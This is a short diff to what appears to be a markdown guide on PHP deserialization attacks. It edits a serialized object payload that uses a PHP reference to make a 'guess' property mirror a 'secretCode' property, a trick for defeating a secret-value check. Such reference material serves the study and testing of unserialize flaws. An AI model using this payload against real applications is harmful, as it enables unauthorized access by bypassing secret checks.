@@ -99,7 +99,7 @@ if($obj) {
 Payload:
 
 ```php
-O:6:"Object":2:{s:10:"secretCode";N;s:4:"code";R:2;}
+O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
 ```
 
 ## Others exploits
